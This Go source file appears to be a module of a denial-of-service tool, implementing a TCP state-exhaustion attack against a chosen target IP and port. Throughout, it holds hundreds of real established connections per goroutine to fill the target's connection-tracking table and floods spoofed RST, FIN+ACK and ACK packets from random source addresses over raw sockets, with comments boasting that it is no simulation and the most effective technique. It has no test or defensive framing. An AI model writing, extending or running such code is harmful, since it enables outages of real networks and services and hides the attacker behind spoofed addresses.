// tcp_exhaustion.go — TCP State-Exhaustion Attack.
// Implements two simultaneous phases:
//   Phase 1: Real TCP connection holding to saturate the target's conntrack table.
//   Phase 2: Spoofed RST/FIN packet flood to confuse stateful firewalls.
// No simulation — real established sockets, real raw-socket packets.
package main

import (
	"encoding/binary"
	"fmt"
	mrand "math/rand"
	"net"
	"sync"
	"time"
	"context"
)

// startTCPStateExhaustion saturates the target's connection-tracking table.
//
// Phase 1 — ESTABLISHED connection flood:
//   Each goroutine opens and holds real TCP connections in ESTABLISHED state.
//   The kernel's conntrack entry is kept alive by setting a large read deadline.
//   Once a goroutine accumulates maxHeld connections it rotates the oldest half,
//   ensuring a continuous high watermark of simultaneous connections.
//
// Phase 2 — RST / FIN storm (spoofed):
//   Half the goroutines continuously send spoofed TCP RST and FIN+ACK packets
//   with random source IPs and sequence numbers.  This achieves two things:
//     a) Forces the target's stateful firewall to look up non-existent sessions
//        and expire them, thrashing its state table.
//     b) Causes the target kernel to emit TCP RST replies, amplifying traffic.
//
//  The combination of real ESTABLISHED connections + spoofed reset storm is
//  the most effective TCP exhaustion technique on Linux/Windows/BSD targets.
func startTCPStateExhaustion(ctx context.Context, opts ContextOpts, targetIP string, targetPort int, threads int, duration time.Duration) {
	fmt.Printf("[TCPEx] State-Exhaustion on %s:%d | threads=%d | dur=%v\n",
		targetIP, targetPort, threads, duration)

	var wg sync.WaitGroup

	holdWorkers := threads / 2
	rstWorkers := threads - holdWorkers

	// ── Phase 1: Connection-holding goroutines ────────────────────────────────
	const maxHeld = 200 // connections per goroutine

	for i := 0; i < holdWorkers; i++ {
		wg.Add(1)
		go func() {
		defer func() { if r := recover(); r != nil { LogErr("SYS", "Panic in anonymous goroutine: %v", r) } }()
			defer wg.Done()

			held := make([]net.Conn, 0, maxHeld)
			addr := fmt.Sprintf("%s:%d", targetIP, targetPort)

			defer func() {
				for _, c := range held {
					c.Close()
				}
			}()

			for {
				select {
				case <-ctx.Done():
					return
				default:
				}

				conn, err := opts.NetTarget.DialTimeout("tcp", addr, 3*time.Second)
				if err != nil {
					time.Sleep(20 * time.Millisecond)
					continue
				}

				// Keep the socket in ESTABLISHED: set a very long read deadline.
				// The server's kernel must maintain a conntrack entry for this socket.
				conn.SetDeadline(time.Now().Add(duration + 30*time.Second))

				// Optionally send a tiny payload to prevent the server from
				// resetting idle connections on some implementations.
				conn.Write([]byte("\r\n"))

				held = append(held, conn)
				AddStats(1, 64)

				// Rotate: when full, close the oldest quarter and make room
				if len(held) >= maxHeld {
					evict := maxHeld / 4
					for j := 0; j < evict; j++ {
						held[j].Close()
					}
					copy(held, held[evict:])
					held = held[:len(held)-evict]
				}
			}
		}()
	}

	// ── Phase 2: Spoofed RST + FIN flood ─────────────────────────────────────
	for i := 0; i < rstWorkers; i++ {
		wg.Add(1)
		go func(threadID int) {
		defer func() { if r := recover(); r != nil { LogErr("SYS", "Panic in anonymous goroutine: %v", r) } }()
			defer wg.Done()
			src := mrand.NewSource(time.Now().UnixNano() + int64(threadID + holdWorkers))
			localRand := mrand.New(src)

			// Socket per thread
			sockFd, err := openRawSocket(IPPROTO_TCP)
			if err != nil {
				return
			}
			defer closeSocket(sockFd)

			for {
				select {
				case <-ctx.Done():
					return
				default:
				}
				sendRSTPacket(sockFd, targetIP, targetPort, localRand)
				sendFINPacket(sockFd, targetIP, targetPort, localRand)
				AddStats(2, 80)
			}
		}(i)
	}

	<-ctx.Done()
	wg.Wait()
	fmt.Println("[TCPEx] TCP State-Exhaustion finished")
}

// sendRSTPacket sends a spoofed TCP RST packet with a random source IP.
func sendRSTPacket(sockFd SocketHandle, targetIP string, targetPort int, localRand *mrand.Rand) {
	dstIP := net.ParseIP(targetIP).To4()
	if dstIP == nil {
		return
	}
	srcIP := randomPublicIPLocal(localRand)

	tcp := make([]byte, 20)
	srcPort := uint16(localRand.Intn(60000) + 1024)
	binary.BigEndian.PutUint16(tcp[0:], srcPort)
	binary.BigEndian.PutUint16(tcp[2:], uint16(targetPort))
	binary.BigEndian.PutUint32(tcp[4:], localRand.Uint32()) // random SEQ
	binary.BigEndian.PutUint32(tcp[8:], localRand.Uint32()) // random ACK
	tcp[12] = 0x50                                       // Data offset = 5 (20 bytes)
	tcp[13] = 0x04                                       // RST flag
	binary.BigEndian.PutUint16(tcp[14:], 0)             // window

	// TCP checksum
	pseudo := buildTCPPseudo(srcIP, dstIP, tcp)
	binary.BigEndian.PutUint16(tcp[16:], checksum(pseudo))

	ipPkt := buildIPHeaderLocal(srcIP, dstIP, IPPROTO_TCP, 40, localRand)
	pkt := append(ipPkt, tcp...)

	if sockFd != InvalidSocket {
		sendtoRaw(sockFd, pkt, dstIP, targetPort)
	}
}

// sendFINPacket sends a spoofed TCP FIN+ACK packet.
func sendFINPacket(sockFd SocketHandle, targetIP string, targetPort int, localRand *mrand.Rand) {
	dstIP := net.ParseIP(targetIP).To4()
	if dstIP == nil {
		return
	}
	srcIP := randomPublicIPLocal(localRand)

	tcp := make([]byte, 20)
	srcPort := uint16(localRand.Intn(60000) + 1024)
	binary.BigEndian.PutUint16(tcp[0:], srcPort)
	binary.BigEndian.PutUint16(tcp[2:], uint16(targetPort))
	binary.BigEndian.PutUint32(tcp[4:], localRand.Uint32())
	binary.BigEndian.PutUint32(tcp[8:], localRand.Uint32()) // ACK number
	tcp[12] = 0x50
	tcp[13] = 0x11 // FIN + ACK
	binary.BigEndian.PutUint16(tcp[14:], 65535)         // max window to look legit

	pseudo := buildTCPPseudo(srcIP, dstIP, tcp)
	binary.BigEndian.PutUint16(tcp[16:], checksum(pseudo))

	ipPkt := buildIPHeaderLocal(srcIP, dstIP, IPPROTO_TCP, 40, localRand)
	pkt := append(ipPkt, tcp...)

	if sockFd != InvalidSocket {
		sendtoRaw(sockFd, pkt, dstIP, targetPort)
	}
}

// sendACKStormPacket sends a spoofed TCP ACK with a wrong SEQ/ACK pair.
func sendACKStormPacket(sockFd SocketHandle, targetIP string, targetPort int) {
	src := mrand.NewSource(time.Now().UnixNano())
	localRand := mrand.New(src)
	dstIP := net.ParseIP(targetIP).To4()
	if dstIP == nil {
		return
	}
	srcIP := randomPublicIPLocal(localRand)

	tcp := make([]byte, 20)
	binary.BigEndian.PutUint16(tcp[0:], uint16(localRand.Intn(60000)+1024))
	binary.BigEndian.PutUint16(tcp[2:], uint16(targetPort))
	binary.BigEndian.PutUint32(tcp[4:], localRand.Uint32())
	binary.BigEndian.PutUint32(tcp[8:], localRand.Uint32())
	tcp[12] = 0x50
	tcp[13] = 0x10 // ACK only
	binary.BigEndian.PutUint16(tcp[14:], 1024)

	pseudo := buildTCPPseudo(srcIP, dstIP, tcp)
	binary.BigEndian.PutUint16(tcp[16:], checksum(pseudo))
	pkt := append(buildIPHeaderLocal(srcIP, dstIP, IPPROTO_TCP, 40, localRand), tcp...)
	if sockFd != InvalidSocket {
		sendtoRaw(sockFd, pkt, dstIP, targetPort)
	}
}

// buildTCPPseudo builds the TCP pseudo-header for checksum calculation.
func buildTCPPseudo(srcIP, dstIP net.IP, tcpHdr []byte) []byte {
	pseudo := make([]byte, 12+len(tcpHdr))
	copy(pseudo[0:4], srcIP.To4())
	copy(pseudo[4:8], dstIP.To4())
	pseudo[9] = IPPROTO_TCP
	binary.BigEndian.PutUint16(pseudo[10:], uint16(len(tcpHdr)))
	copy(pseudo[12:], tcpHdr)
	return pseudo
}

// sendRSTRaw is the legacy wrapper kept for compatibility with other files.
func sendRSTRaw(targetIP string, targetPort int) {
	// Socket per call (legacy)
	sockFd, err := openRawSocket(IPPROTO_TCP)
	if err != nil {
		return
	}
	defer closeSocket(sockFd)
	src := mrand.NewSource(time.Now().UnixNano())
	localRand := mrand.New(src)
	sendRSTPacket(sockFd, targetIP, targetPort, localRand)
}

// sendFINRaw is the legacy wrapper kept for compatibility with other files.
func sendFINRaw(targetIP string, targetPort int) {
	// Socket per call (legacy)
	sockFd, err := openRawSocket(IPPROTO_TCP)
	if err != nil {
		return
	}
	defer closeSocket(sockFd)
	src := mrand.NewSource(time.Now().UnixNano())
	localRand := mrand.New(src)
	sendFINPacket(sockFd, targetIP, targetPort, localRand)
}
